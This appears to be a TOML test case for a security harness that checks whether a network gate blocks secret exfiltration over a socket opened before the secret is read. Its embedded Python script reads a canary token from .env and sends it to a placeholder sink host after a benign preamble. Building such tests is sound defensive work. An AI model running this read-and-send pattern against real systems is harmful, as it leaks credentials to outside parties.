# The connection is opened before any secret is read, so the connect() is
# allowed and a benign preamble goes through. After the read, a write to the
# already-connected external peer must be refused: the gate re-checks the
# socket's peer at every write, not just at connect.
name = "preconnected-stream-exfil"
kind = "attack"
policy = "recommended"

[[files]]
path = ".env"
contents = "TOKEN={CANARY}\n"

[[files]]
path = "preconnect.py"
contents = """
import socket
s = socket.socket()
s.connect(("{SINK_HOST}", {SINK_PORT}))
s.sendall(b"benign-preamble")
secret = open(".env", "rb").read()
try:
    s.sendall(secret)
except PermissionError:
    pass
"""

[[steps]]
shell = 0
run = "python3 preconnect.py"
expect = "any"

[oracle]
encodings = ["raw", "base64", "hex"]
